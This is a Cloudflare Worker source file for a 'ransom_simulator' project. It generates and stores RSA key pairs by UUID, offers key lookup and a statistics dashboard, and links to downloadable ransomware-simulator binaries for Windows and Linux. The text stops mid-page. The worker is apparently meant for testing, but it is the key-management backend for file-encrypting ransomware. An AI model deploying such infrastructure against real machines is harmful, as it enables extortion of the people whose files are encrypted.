// ===================================================================================
// _worker.js - 合并后的 Cloudflare Worker
// 功能：RSA 密钥对生成 + UUID 分发（支持安全路径）+ 密钥查询 + 统计面板 + 浏览器端解密
//      + 终端心跳采集与在线管理后台（/api/heartbeat、/admin）
// ===================================================================================

// ===================================================================================
// 默认安全路径 (可自行修改)
// 当环境变量 SECRET_PATH 未设置时，使用此默认值作为密钥生成接口的访问路径
// ===================================================================================
const DEFAULT_SECRET_PATH = "E56dSY";

// ===================================================================================
// 第一部分：RSA 密钥生成
// ===================================================================================

/**
 * 将 ArrayBuffer 转换为 PEM 格式的密钥字符串
 */
function toPem(keyData, type) {
    const base64 = btoa(String.fromCharCode(...new Uint8Array(keyData)));
    const header = type === 'public' ? 'BEGIN PUBLIC KEY' : 'BEGIN PRIVATE KEY';
    const footer = type === 'public' ? 'END PUBLIC KEY' : 'END PRIVATE KEY';
    const pem = base64.match(/.{1,64}/g).join('\n');
    return `-----${header}-----\n${pem}\n-----${footer}-----`;
}

/**
 * 生成 RSA 密钥对并返回 PEM + JWK 格式
 */
async function generateRSAKeys() {
    const uuid = self.crypto.randomUUID();
    const keyPair = await crypto.subtle.generateKey(
        {
            name: "RSA-OAEP",
            modulusLength: 2048,
            publicExponent: new Uint8Array([0x01, 0x00, 0x01]),
            hash: "SHA-256",
        },
        true,
        ["encrypt", "decrypt"]
    );

    const publicKeyPem = toPem(await crypto.subtle.exportKey("spki", keyPair.publicKey), 'public');
    const privateKeyPem = toPem(await crypto.subtle.exportKey("pkcs8", keyPair.privateKey), 'private');
    const publicJwk = await crypto.subtle.exportKey("jwk", keyPair.publicKey);
    const privateJwk = await crypto.subtle.exportKey("jwk", keyPair.privateKey);

    return { uuid, publicKeyPem, privateKeyPem, publicJwk, privateJwk };
}

/**
 * 处理 RSA 密钥生成请求（POST）
 * 注意：安全路径校验已在主 fetch 路由层完成，此处不再重复检查
 */
async function handleKeyGeneration(request, env) {
    // 只允许 POST 请求
    if (request.method !== 'POST') {
        return new Response(JSON.stringify({ status: "error", message: "只支持 POST 请求" }), {
            headers: { 'Content-Type': 'application/json' },
            status: 405
        });
    }

    // 检查 Content-Type
    const contentType = request.headers.get("content-type") || "";
    if (!contentType.includes("application/json")) {
        return new Response(JSON.stringify({ status: "error", message: "Content-Type 必须是 application/json" }), {
            headers: { 'Content-Type': 'application/json' },
            status: 415
        });
    }

    // Turnstile 人机验证
    const turnstileSecret = await resolveTurnstileSecretKey(env);
    if (turnstileSecret) {
        let body;
        try {
            body = await request.clone().json();
        } catch {
            return new Response(JSON.stringify({ status: "error", message: "请求体解析失败" }), {
                headers: { 'Content-Type': 'application/json' },
                status: 400
            });
        }
        const token = body['cf-turnstile-response'];
        if (!token) {
            return new Response(JSON.stringify({ status: "error", message: "缺少人机验证 token" }), {
                headers: { 'Content-Type': 'application/json' },
                status: 400
            });
        }
        const formData = new FormData();
        formData.append('secret', turnstileSecret);
        formData.append('response', token);
        const verifyResult = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
            method: 'POST',
            body: formData,
        });
        const verifyOutcome = await verifyResult.json();
        if (!verifyOutcome.success) {
            return new Response(JSON.stringify({ status: "error", message: "人机验证失败，请重试" }), {
                headers: { 'Content-Type': 'application/json' },
                status: 403
            });
        }
    }

    // 验证通过，调用核心密钥生成逻辑
    return handleKeyGenerationSecure(request, env);
}

/**
 * 处理 RSA 密钥生成请求的核心逻辑（无 Turnstile 人机验证）
 * 供安全路径（如 /E56dSY）直接调用，也供 handleKeyGeneration 在验证通过后调用
 */
async function handleKeyGenerationSecure(request, env) {
    let uuid, publicKeyPem, privateKeyPem, publicJwk, privateJwk;

    try {
        const keys = await generateRSAKeys();
        uuid = keys.uuid;
        publicKeyPem = keys.publicKeyPem;
        privateKeyPem = keys.privateKeyPem;
        publicJwk = keys.publicJwk;
        privateJwk = keys.privateJwk;
    } catch (keyGenError) {
        console.error(`Error generating RSA key pair: ${keyGenError.message}`, keyGenError);
        return new Response(JSON.stringify({
            status: "error",
            message: `生成 UUID 或 RSA 密钥对失败: ${keyGenError.message}`
        }), {
            headers: { 'Content-Type': 'application/json' },
            status: 500
        });
    }

    // 写入 D1 数据库
    try {
        if (!env.DB || typeof env.DB.prepare !== 'function') {
            const errMsg = "D1 数据库绑定 'DB' 未正确初始化或缺失。";
            console.error(errMsg, { db_binding: env.DB });
            return new Response(JSON.stringify({
                status: "error",
                message: errMsg,
                db_error_code: "D1_BINDING_MISSING"
            }), {
                headers: { 'Content-Type': 'application/json' },
                status: 500
            });
        }

        const stmt = env.DB.prepare(
            "INSERT INTO keys (uuid, public_key, private_key) VALUES (?, ?, ?)"
        );
        const result = await stmt.bind(uuid, publicKeyPem, privateKeyPem).run();

        // 更新 key_metrics 统计表（不受 keys 表清理影响）
        const now = new Date().toISOString();
        await env.DB.prepare(
            "UPDATE key_metrics SET total_generated = total_generated + 1, latest_uuid = ?, latest_generated_at = ? WHERE id = 1"
        ).bind(uuid, now).run();

        if (result.success) {
            console.log(`Successfully saved UUID: ${uuid} to D1.`);
            return new Response(JSON.stringify({
                status: "success",
                message: "UUID 和 RSA 密钥对生成并保存成功。",
                uuid: uuid,
                public_key_pem: publicKeyPem,
                private_key_pem: privateKeyPem,
                public_key_jwk: publicJwk,
                private_key_jwk: privateJwk
            }), {
                headers: { 'Content-Type': 'application/json' },
                status: 200
            });
        } else {
            const errMsg = "UUID 和 RSA 密钥对生成成功，但写入 D1 数据库失败。";
            console.error(`${errMsg} D1 result indicated failure:`, result.error);
            return new Response(JSON.stringify({
                status: "error",
                message: errMsg,
                db_error: result.error || "未知 D1 数据库错误。",
                db_error_code: "D1_INSERT_FAILED",
                uuid: uuid
            }), {
                headers: { 'Content-Type': 'application/json' },
                status: 500
            });
        }
    } catch (dbError) {
        const errMsg = "UUID 和 RSA 密钥对生成成功，但写入 D1 数据库时发生意外错误。";
        console.error(`${errMsg} Caught D1 error: ${dbError.message}`, dbError);
        return new Response(JSON.stringify({
            status: "error",
            message: errMsg,
            db_error: dbError.message || dbError,
            db_error_code: "D1_UNEXPECTED_ERROR",
            uuid: uuid
        }), {
            headers: { 'Content-Type': 'application/json' },
            status: 500
        });
    }
}

// ===================================================================================
// 第二部分：密钥查询与统计面板
// ===================================================================================

async function getHtmlPage(env) {
    const turnstileSiteKey = await resolveTurnstileSiteKey(env);
    const CLIENT_SCRIPT = `
      document.addEventListener('DOMContentLoaded', () => {
          lucide.createIcons();
          initDashboard();
          const queryForm = document.getElementById('keyQueryForm');
          const uuidInput = document.getElementById('uuidInput');
          const resultContainer = document.getElementById('query-result');
          if (uuidInput) uuidInput.focus();
          if (queryForm) {
              queryForm.addEventListener('submit', async function(e) {
                  e.preventDefault();
                  const uuid = uuidInput.value.trim();
                  if (!uuid) {
                      showError(resultContainer, 'UUID 不能为空。');
                      return;
                  }
                  resultContainer.style.display = 'block';
                  resultContainer.innerHTML = \`
                    <div class="bg-blue-50 border-l-4 border-blue-500 text-blue-700 p-4 rounded">
                      <div class="flex items-center">
                        <i data-lucide="loader-circle" class="w-5 h-5 mr-3 animate-spin"></i>
                        <span>正在查询...</span>
                      </div>
                    </div>
                  \`;
                  lucide.createIcons();
                  try {
                      const response = await fetch('/query?uuid=' + encodeURIComponent(uuid));
                      const data = await response.json();
                      if (data.status === 'success') {
                          renderSuccess(resultContainer, data);
                      } else {
                          showError(resultContainer, data.message + ' (UUID: ' + escapeHtml(uuid) + ')');
                      }
                  } catch (error) {
                      showError(resultContainer, '网络错误: ' + error.message);
                  }
              });
          }
          const generateBtn = document.getElementById('generateKeyBtn');
          const generateResult = document.getElementById('generate-result');
          if (generateBtn) {
              generateBtn.addEventListener('click', async function() {
                  generateBtn.disabled = true;
                  generateBtn.innerHTML = '<i data-lucide="loader-circle" class="w-5 h-5 mr-3 animate-spin"></i> 正在生成...';
                  lucide.createIcons();
                  generateResult.style.display = 'block';
                  generateResult.innerHTML = \`
                    <div class="bg-blue-50 border-l-4 border-blue-500 text-blue-700 p-4 rounded">
                      <div class="flex items-center">
                        <i data-lucide="loader-circle" class="w-5 h-5 mr-3 animate-spin"></i>
                        <span>正在生成密钥，请稍候...</span>
                      </div>
                    </div>
                  \`;
                  lucide.createIcons();
                  try {
                      let requestBody = {};
                      const turnstileWidget = document.querySelector('.cf-turnstile');
                      if (turnstileWidget && typeof turnstile !== 'undefined') {
                          const token = turnstile.getResponse();
                          if (!token) {
                              showError(generateResult, '请先完成人机验证');
                              generateBtn.disabled = false;
                              generateBtn.innerHTML = '<i data-lucide="sparkles" class="w-5 h-5 mr-3"></i> 生成密钥';
                              lucide.createIcons();
                              return;
                          }
                          requestBody['cf-turnstile-response'] = token;
                      }
                      const response = await fetch('/api/generate', {
                          method: 'POST',
                          headers: { 'Content-Type': 'application/json' },
                          body: JSON.stringify(requestBody)
                      });
                      const data = await response.json();
                      if (data.status === 'success') {
                          renderGenerateSuccess(generateResult, data);
                          initDashboard();
                      } else {
                          showError(generateResult, data.message);
                      }
                  } catch (error) {
                      showError(generateResult, '网络错误: ' + error.message);
                  } finally {
                      generateBtn.disabled = false;
                      generateBtn.innerHTML = '<i data-lucide="sparkles" class="w-5 h-5 mr-3"></i> 生成密钥';
                      lucide.createIcons();
                  }
              });
          }
      });
      let chartInstance = null;
      let currentRange = '1m';
      async function initDashboard() {
          const totalEl = document.getElementById('stat-total');
          const latestEl = document.getElementById('stat-latest');
          const chartCtx = document.getElementById('trendChart');
          try {
              const res = await fetch('/stats?range=' + currentRange);
              const data = await res.json();
              if(data.status === 'success') {
                  totalEl.innerText = data.total;
                  if (data.latest && data.latest.created_at) {
                       updateLatestSubmission(latestEl, data.latest);
                  } else {
                       latestEl.innerHTML = \`
                         <div class="flex items-center justify-center text-gray-500">
                           <i data-lucide="clock" class="w-4 h-4 mr-2"></i>
                           <span>暂无提交记录</span>
                         </div>
                       \`;
                       lucide.createIcons();
                  }
                  if (chartCtx) {
                      renderChart(chartCtx, data.history);
                  }
              }
          } catch (e) {
              console.error("Dashboard error:", e);
              totalEl.innerText = "-";
              latestEl.innerHTML = \`
                <div class="flex items-center justify-center text-red-600">
                  <i data-lucide="alert-triangle" class="w-4 h-4 mr-2"></i>
                  <span>统计服务暂不可用</span>
                </div>
              \`;
              lucide.createIcons();
          }
          setupTimeRangeSelector();
      }
      function updateLatestSubmission(element, latestData) {
          const date = new Date(latestData.created_at);
          const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
          const timeZoneOffset = -date.getTimezoneOffset() / 60;
          const timeZoneSign = timeZoneOffset >= 0 ? '+' : '';
          const timeZoneStr = \`UTC\${timeZoneSign}\${timeZoneOffset}:00\`;
          const dateStr = date.toLocaleDateString('zh-CN', { year: 'numeric', month: '2-digit', day: '2-digit' }) + ' ' + date.toLocaleTimeString('zh-CN', { hour: '2-digit', minute: '2-digit', hour12: false });
          const isoStr = date.toISOString().replace('T', ' ').substring(0, 19);
          const maskedUuid = latestData.uuid ? latestData.uuid.substring(0, 8) + '...' : '未知';
          element.innerHTML = \`
              <div class="text-center">
                <div class="flex items-center justify-center mb-1">
                  <i data-lucide="clock" class="w-4 h-4 mr-2 text-gray-600"></i>
                  <span class="font-medium">最新提交: \${dateStr}</span>
                </div>
                <div class="text-xs text-gray-500 italic mt-1">
                  <i data-lucide="globe" class="w-3 h-3 inline mr-1"></i>
                  \${timeZone} (\${timeZoneStr}) | \${isoStr}Z
                </div>
                <div class="text-xs text-gray-600 mt-1">ID: \${maskedUuid}</div>
              </div>
          \`;
          lucide.createIcons();
      }
      function setupTimeRangeSelector() {
          const buttons = document.querySelectorAll('.time-range-btn');
          buttons.forEach(btn => {
              btn.addEventListener('click', function() {
                  buttons.forEach(b => b.classList.remove('bg-gray-700', 'text-white'));
                  buttons.forEach(b => b.classList.add('bg-gray-50', 'text-gray-600', 'hover:bg-gray-100'));
                  this.classList.remove('bg-gray-50', 'text-gray-600', 'hover:bg-gray-100');
                  this.classList.add('bg-gray-700', 'text-white');
                  currentRange = this.dataset.range;
                  reloadChartData();
              });
          });
          const defaultBtn = document.querySelector('.time-range-btn[data-range="1m"]');
          if (defaultBtn) {
              defaultBtn.classList.remove('bg-gray-50', 'text-gray-600', 'hover:bg-gray-100');
              defaultBtn.classList.add('bg-gray-700', 'text-white');
          }
      }
      async function reloadChartData() {
          const chartCtx = document.getElementById('trendChart');
          const latestEl = document.getElementById('stat-latest');
          try {
              const res = await fetch('/stats?range=' + currentRange);
              const data = await res.json();
              if(data.status === 'success') {
                  if (chartInstance) { updateChart(chartInstance, data.history); }
                  if (data.latest && data.latest.created_at) { updateLatestSubmission(latestEl, data.latest); }
              }
          } catch (e) { console.error("Failed to reload chart data:", e); }
      }
      function renderChart(ctx, historyData) {
          if (chartInstance) { chartInstance.destroy(); }
          const labels = formatChartLabels(historyData, currentRange);
          const counts = historyData.map(item => item.count);
          chartInstance = new Chart(ctx, {
              type: 'line',
              data: {
                  labels: labels,
                  datasets: [{
                      label: '密钥生成趋势', data: counts,
                      borderColor: '#4b5563', backgroundColor: 'rgba(75, 85, 99, 0.1)',
                      borderWidth: 2, pointRadius: 3, fill: true, tension: 0.3
                  }]
              },
              options: {
                  responsive: true, maintainAspectRatio: false,
                  plugins: { legend: { display: false }, tooltip: { mode: 'index', intersect: false, callbacks: { title: function(context) { return context[0].label; }, label: function(context) { return '生成数量: ' + context.parsed.y; } } } },
                  scales: { y: { beginAtZero: true, grid: { color: '#f3f4f6' }, ticks: { stepSize: 1 } }, x: { grid: { display: false } } }
              }
          });
      }
      function updateChart(chart, historyData) {
          chart.data.labels = formatChartLabels(historyData, currentRange);
          chart.data.datasets[0].data = historyData.map(item => item.count);
          chart.update();
      }
      function formatChartLabels(historyData, range) {
          if (!historyData || historyData.length === 0) return [];
          return historyData.map(item => {
              const d = new Date(item.date);
              switch(range) {
                  case '1m': case '3m': return (d.getMonth() + 1) + '/' + d.getDate();
                  case '6m': case '1y': return d.getFullYear() + '/' + (d.getMonth() + 1);
                  default: return (d.getMonth() + 1) + '/' + d.getDate();
              }
          });
      }
      function showError(container, msg) {
          container.style.display = 'block';
          container.innerHTML = \`
            <div class="bg-red-50 border-l-4 border-red-500 text-red-700 p-4 rounded">
              <div class="flex items-center">
                <i data-lucide="alert-triangle" class="w-5 h-5 mr-3"></i>
                <span>\${escapeHtml(msg)}</span>
              </div>
            </div>
          \`;
          lucide.createIcons();
      }
      function renderSuccess(container, data) {
           let html = \`
             <div class="mb-6">
               <div class="flex items-center justify-center mb-4">
                 <i data-lucide="check-circle" class="w-6 h-6 mr-2 text-green-500"></i>
                 <h3 class="text-xl font-semibold text-gray-800">查询成功</h3>
               </div>
               <div class="bg-green-50 border-l-4 border-green-500 text-green-700 p-4 rounded mb-4">
                 <strong>UUID:</strong> \${escapeHtml(data.uuid)}
               </div>
           \`;
           if (data.rid) html += \`
             <div class="bg-green-50 border-l-4 border-green-500 text-green-700 p-4 rounded mb-4">
               <strong>RID:</strong> \${escapeHtml(data.rid)}
             </div>
           \`;
           if (data.public_key) {
               html += buildKeyField('公钥内容', 'publicKey', data.public_key, data.uuid, 'public');
           }
           if (data.private_key) {
               html += buildKeyField('私钥内容', 'privateKey', data.private_key, data.uuid, 'private');
               html += \`
                 <div class="bg-red-50 border-l-4 border-red-500 text-red-700 p-4 rounded mt-4">
                   <div class="flex items-center">
                     <i data-lucide="alert-circle" class="w-5 h-5 mr-2"></i>
                     <span><strong>请务必妥善保管私钥。</strong></span>
                   </div>
                 </div>
               \`;
           }
           html += \`</div>\`;
           container.innerHTML = html;
           lucide.createIcons();
      }
      function renderGenerateSuccess(container, data) {
           let html = \`
             <div class="mb-6">
               <div class="flex items-center justify-center mb-4">
                 <i data-lucide="check-circle" class="w-6 h-6 mr-2 text-green-500"></i>
                 <h3 class="text-xl font-semibold text-gray-800">密钥生成成功</h3>
               </div>
               <div class="bg-green-50 border-l-4 border-green-500 text-green-700 p-4 rounded mb-4">
                 <strong>UUID:</strong> \${escapeHtml(data.uuid)}
               </div>
           \`;
           if (data.public_key_pem) {
               html += buildKeyField('公钥内容', 'genPublicKey', data.public_key_pem, data.uuid, 'public');
           }
           if (data.private_key_pem) {
               html += buildKeyField('私钥内容', 'genPrivateKey', data.private_key_pem, data.uuid, 'private');
               html += \`
                 <div class="bg-red-50 border-l-4 border-red-500 text-red-700 p-4 rounded mt-4">
                   <div class="flex items-center">
                     <i data-lucide="alert-circle" class="w-5 h-5 mr-2"></i>
                     <span><strong>请务必妥善保管私钥。</strong>私钥仅在此次生成时可见，刷新页面后将无法找回。</span>
                   </div>
                 </div>
               \`;
           }
           html += \`</div>\`;
           container.innerHTML = html;
           lucide.createIcons();
      }
      function buildKeyField(label, id, content, uuid, type) {
          const rows = type === 'private' ? 12 : 8;
          return \`
            <div class="mb-6">
              <label for="\${id}" class="block text-sm font-medium text-gray-700 mb-2">\${label}</label>
              <textarea id="\${id}" rows="\${rows}" readonly class="w-full p-3 border-2 border-gray-400 rounded font-mono text-sm bg-white resize-none">\${escapeHtml(content)}</textarea>
              <div class="flex gap-3 mt-3">
                <button type="button" onclick="copyKey('\${id}')" class="flex items-center px-4 py-2 bg-gray-200 text-gray-700 border-2 border-gray-400 rounded hover:bg-gray-300 transition-colors">
                  <i data-lucide="copy" class="w-4 h-4 mr-2"></i> 复制
                </button>
                <button type="button" onclick="downloadKey('\${id}', '\${escapeHtml(uuid)}', '\${type}')" class="flex items-center px-4 py-2 bg-gray-700 text-white border-2 border-gray-700 rounded hover:bg-gray-800 transition-colors">
                  <i data-lucide="download" class="w-4 h-4 mr-2"></i> 下载
                </button>
              </div>
            </div>
          \`;
      }
      function escapeHtml(text) {
          if (!text) return '';
          return String(text).replace(/[&<>"']/g, function(m) { return {'&':'&','<':'<','>':'>','"':'"',"'":'&#039;'}[m]; });
      }
      window.copyKey = function(id) {
          const el = document.getElementById(id);
          if(!el) return;
          navigator.clipboard.writeText(el.value).then(() => {
              const btn = document.querySelector(\`button[onclick="copyKey('\${id}')"]\`);
              if (btn) {
                  const originalHTML = btn.innerHTML;
                  btn.innerHTML = '<i data-lucide="check" class="w-4 h-4 mr-2"></i>已复制';
                  lucide.createIcons();
                  setTimeout(() => { btn.innerHTML = originalHTML; lucide.createIcons(); }, 2000);
              }
          }).catch(e => alert('复制失败: ' + e.message));
      };
      window.downloadKey = function(id, uuid, type) {
          const content = document.getElementById(id)?.value;
          if(!content) return;
          const blob = new Blob([content], {type: 'application/x-pem-file;charset=utf-8'});
          const a = document.createElement('a');
          a.href = URL.createObjectURL(blob);
          a.download = \`\${type}_key_\${uuid}.pem\`;
          document.body.appendChild(a);
          a.click();
          document.body.removeChild(a);
      };
    `;

    return `
<!DOCTYPE html>
<html lang="zh-CN" class="scroll-smooth">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ransom_simulator</title>
    <link rel="icon" href="https://s3.yangzifun.org/logo.ico" type="image/x-icon">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <script>
      tailwind.config = {
        theme: {
          extend: {
            colors: {
              gray: {
                50: '#f8f9fa', 100: '#f1f3f4', 200: '#e8ebed', 300: '#d1d5db',
                400: '#9ca3af', 500: '#89949B', 600: '#5a666d', 700: '#3d474d',
              }
            },
            fontFamily: {
              'sans': ['-apple-system', 'BlinkMacSystemFont', '"Segoe UI"', 'Roboto', 'sans-serif'],
              'mono': ['SF Mono', 'Courier New', 'monospace']
            }
          }
        }
      }
    </script>
    <style>
      @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
      html { font-size: 87.5%; }
      body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
      .chart-container { position: relative; height: 200px; }
      /* .platform-grid 已移除，改用 Tailwind grid-cols 响应式类 */
      @media (max-width: 768px) { .stats-grid { grid-template-columns: 1fr; } }
    </style>
</head>
<body class="bg-white min-h-screen text-gray-700">
    <div class="min-h-screen flex flex-col items-center py-10 px-4 sm:px-6 lg:px-8">
        <div class="w-full max-w-7xl mx-auto text-center z-10">
            <div class="mb-10">
                <div class="flex items-center justify-center mb-4">
                    <i data-lucide="shield" class="w-10 h-10 mr-4 text-gray-600"></i>
                    <h1 class="text-3xl sm:text-4xl font-bold text-gray-700">ransom_simulator</h1>
                </div>
                <p class="text-gray-500 text-lg mb-8 min-h-[1.2em]">安全、跨平台的文件加密解决方案与数据看板</p>
            </div>

            <!-- 通知公告 -->
            <div class="bg-yellow-50 border border-yellow-400 rounded-xl p-5 mb-8 text-left">
                <div class="flex items-start">
                    <i data-lucide="megaphone" class="w-6 h-6 mr-3 text-yellow-600 flex-shrink-0 mt-0.5"></i>
                    <div>
                        <span class="font-semibold text-yellow-800">通知公告：</span>
                        <span class="text-yellow-700">数据库清理，清理时间 2026年6月24日</span>
                    </div>
                </div>
            </div>

            <div class="bg-gray-50 border border-gray-200 rounded-xl p-6 mb-8 text-left">
                <div class="flex items-center justify-center mb-6">
                    <i data-lucide="trending-up" class="w-6 h-6 mr-3 text-gray-600"></i>
                    <h2 class="text-2xl font-semibold text-gray-700">系统概况</h2>
                </div>
                <div class="grid stats-grid lg:grid-cols-2 gap-6 mb-6">
                    <div class="flex flex-col justify-center items-center text-center border-r-0 lg:border-r border-gray-200 pr-0 lg:pr-6 pb-6 lg:pb-0">
                        <div class="text-sm uppercase tracking-wider text-gray-500 mb-2">已生成密钥总数</div>
                        <div class="text-5xl font-bold text-gray-700 mb-4" id="stat-total">...</div>
                        <div class="text-sm text-gray-600 bg-gray-200 px-4 py-1 rounded-full" id="stat-latest">
                            <div class="flex items-center justify-center text-gray-500">
                                <i data-lucide="loader-circle" class="w-4 h-4 mr-2 animate-spin"></i>
                                <span>正在加载数据...</span>
                            </div>
                        </div>
                    </div>
                    <div>
                        <div class="flex flex-wrap justify-center gap-2 mb-6">
                            <button class="time-range-btn px-4 py-2 text-sm bg-gray-50 text-gray-600 border border-gray-400 rounded hover:bg-gray-100 transition-colors" data-range="1m">1个月</button>
                            <button class="time-range-btn px-4 py-2 text-sm bg-gray-50 text-gray-600 border border-gray-400 rounded hover:bg-gray-100 transition-colors" data-range="3m">3个月</button>
                            <button class="time-range-btn px-4 py-2 text-sm bg-gray-50 text-gray-600 border border-gray-400 rounded hover:bg-gray-100 transition-colors" data-range="6m">6个月</button>
                            <button class="time-range-btn px-4 py-2 text-sm bg-gray-50 text-gray-600 border border-gray-400 rounded hover:bg-gray-100 transition-colors" data-range="1y">1年</button>
                        </div>
                        <div class="chart-container"><canvas id="trendChart"></canvas></div>
                    </div>
                </div>
            </div>

            <div class="bg-gray-50 border border-gray-200 rounded-xl p-6 mb-8 text-left">
                <div class="flex items-center justify-center mb-6">
                    <i data-lucide="key" class="w-6 h-6 mr-3 text-gray-600"></i>
                    <h2 class="text-2xl font-semibold text-gray-700">密钥管理</h2>
                </div>
                <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
                    <!-- 左侧：密钥查询 -->
                    <div class="border-r-0 lg:border-r border-gray-200 pr-0 lg:pr-6">
                        <div class="flex items-center mb-4">
                            <i data-lucide="search" class="w-5 h-5 mr-2 text-gray-600"></i>
                            <h3 class="text-lg font-semibold text-gray-700">密钥查询</h3>
                        </div>
                        <form id="keyQueryForm" class="space-y-4">
                            <div>
                                <label for="uuidInput" class="block text-sm font-medium text-gray-700 mb-2">输入 UUID:</label>
                                <input type="text" id="uuidInput" name="uuid" placeholder="例如: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" required class="w-full px-4 py-3 border-2 border-gray-400 rounded font-mono text-sm focus:outline-none focus:border-gray-600">
                            </div>
                            <button type="submit" class="w-full flex items-center justify-center px-6 py-3 bg-gray-700 text-white border-2 border-gray-700 rounded font-medium hover:bg-gray-800 transition-colors">
                                <i data-lucide="send" class="w-5 h-5 mr-3"></i> 查询密钥
                            </button>
                        </form>
                        <div id="query-result" class="mt-6" style="display: none;"></div>
                    </div>
                    <!-- 右侧：密钥生成 -->
                    <div class="pl-0 lg:pl-6">
                        <div class="flex items-center mb-4">
                            <i data-lucide="plus-circle" class="w-5 h-5 mr-2 text-gray-600"></i>
                            <h3 class="text-lg font-semibold text-gray-700">生成密钥</h3>
                        </div>
                        <p class="text-sm text-gray-500 mb-4">点击下方按钮生成新的 RSA 密钥对及 UUID。</p>
                        ${turnstileSiteKey ? `<div class="cf-turnstile mb-4" data-sitekey="${turnstileSiteKey}" data-theme="light"></div>` : ''}
                        <button type="button" id="generateKeyBtn" class="w-full flex items-center justify-center px-6 py-3 bg-gray-700 text-white border-2 border-gray-700 rounded font-medium hover:bg-gray-800 transition-colors">
                            <i data-lucide="sparkles" class="w-5 h-5 mr-3"></i> 生成密钥
                        </button>
                        <div id="generate-result" class="mt-6" style="display: none;"></div>
                    </div>
                </div>
            </div>

            <div class="bg-gray-50 border border-gray-200 rounded-xl p-6 mb-8 text-left">
                <div class="flex items-center justify-center mb-6">
                    <i data-lucide="download" class="w-6 h-6 mr-3 text-gray-600"></i>
                    <h2 class="text-2xl font-semibold text-gray-700">🔒 加密组件</h2>
                </div>
                <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-5 mb-10">
                    <!-- Windows -->
                    <div class="relative border border-blue-200 rounded-xl p-6 bg-gradient-to-b from-blue-50 to-white shadow-md hover:shadow-xl hover:-translate-y-1 transition-all duration-300 flex flex-col group">
                        <span class="absolute top-3 right-3 bg-red-500 text-white text-xs px-2 py-0.5 rounded-full font-semibold">⚠ 危险</span>
                        <div class="flex flex-col items-center mb-4">
                            <div class="w-14 h-14 rounded-full bg-blue-100 flex items-center justify-center mb-3 group-hover:scale-110 transition-transform duration-300">
                                <i data-lucide="monitor" class="w-7 h-7 text-blue-600"></i>
                            </div>
                            <h3 class="text-lg font-semibold text-gray-800">Windows</h3>
                            <p class="text-xs text-gray-500 mt-1">勒索模拟程序</p>
                        </div>
                        <div class="flex items-center justify-center mb-4 text-xs text-gray-500 space-x-2">
                            <i data-lucide="hard-drive" class="w-3.5 h-3.5"></i>
                            <span>x86_64 .exe</span>
                        </div>
                        <a href="https://s3.yangzifun.org/crypt/ransom_simulator.exe" class="flex items-center justify-center px-4 py-2.5 bg-gradient-to-r from-blue-600 to-blue-700 text-white rounded-lg hover:from-blue-700 hover:to-blue-800 transition-all duration-300 shadow-md hover:shadow-lg mt-auto" download>
                            <i data-lucide="download" class="w-4 h-4 mr-2"></i>
                            <span class="text-sm font-medium">下载 .exe</span>
                        </a>
                    </div>
                    <!-- Linux 动态链接 -->
                    <div class="relative border border-amber-200 rounded-xl p-6 bg-gradient-to-b from-amber-50 to-white shadow-md hover:shadow-xl hover:-translate-y-1 transition-all duration-300 flex flex-col group">
                        <span class="absolute top-3 right-3 bg-red-500 text-white text-xs px-2 py-0.5 rounded-full font-semibold">⚠ 危险</span>
                        <div class="flex flex-col items-center mb-4">
                            <div class="w-14 h-14 rounded-full bg-amber-100 flex items-center justify-center mb-3 group-hover:scale-110 transition-transform duration-300">
                                <i data-lucide="terminal" class="w-7 h-7 text-amber-600"></i>
                            </div>
                            <h3 class="text-lg font-semibold text-gray-800">Linux</h3>
                            <p class="text-xs text-gray-500 mt-1">动态链接版</p>
                        </div>
                        <div class="flex items-center justify-center mb-4 text-xs text-gray-500 space-x-2">
                            <i data-lucide="cpu" class="w-3.5 h-3.5"></i>
                            <span>x86_64 ELF</span>
                        </div>
                        <a href="https://s3.yangzifun.org/crypt/ransom_simulator_linux" class="flex items-center justify-center px-4 py-2.5 bg-gradient-to-r from-amber-500 to-amber-600 text-white rounded-lg hover:from-amber-600 hover:to-amber-700 transition-all duration-300 shadow-md hover:shadow-lg mt-auto" download>
                            <i data-lucide="download" class="w-4 h-4 mr-2"></i>
                            <span class="text-sm font-medium">下载动态链接版</span>
                        </a>
                    </div>
                    <!-- Linux 静态编译 -->
                    <div class="relative border border-emerald-200 rounded-xl p-6 bg-gradient-to-b from-emerald-50 to-white shadow-md hover:shadow-xl hover:-translate-y-1 transition-all duration-300 flex flex-col group">
                        <span class="absolute top-3 right-3 bg-red-500 text-white text-xs px-2 py-0.5 rounded-full font-semibold">⚠ 危险</span>
                        <div class="flex flex-col items-center mb-4">
                            <div class="w-14 h-14 rounded-full bg-emerald-100 flex items-center justify-center mb-3 group-hover:scale-110 transition-transform duration-300">
                                <i data-lucide="box" class="w-7 h-7 text-emerald-600"></i>
                            </div>
                            <h3 class="text-lg font-semibold text-gray-800">Linux</h3>
                            <p class="text-xs text-gray-500 mt-1">静态编译版</p>
                        </div>
                        <div class="flex items-center justify-center mb-4 text-xs text-gray-500 space-x-2">
                            <i data-lucide="package" class="w-3.5 h-3.5"></i>
                            <span>静态 x86_64</span>
                        </div>
                        <a href="https://s3.yangzifun.org/crypt/ransom_simulator_linux_static" class="flex items-center justify-center px-4 py-2.5 bg-gradient-to-r from-emerald-600 to-emerald-700 text-white rounded-lg hover:from-emerald-700 hover:to-emerald-800 transition-all duration-300 shadow-md hover:shadow-lg mt-auto" download>
                            <i data-lucide="download" class="w-4 h-4 mr-2"></i>
                            <span class="text-sm font-medium">下载静态编译版</span>
                        </a>
                    </div>
                    <!-- macOS -->
                    <div class="relative border border-gray-300 rounded-xl p-6 bg-gradient-to-b from-gray-50 to-white shadow-md hover:shadow-xl hover:-translate-y-1 transition-all duration-300 flex flex-col group">
                        <span class="absolute top-3 right-3 bg-red-500 text-white text-xs px-2 py-0.5 rounded-full font-semibold">⚠ 危险</span>
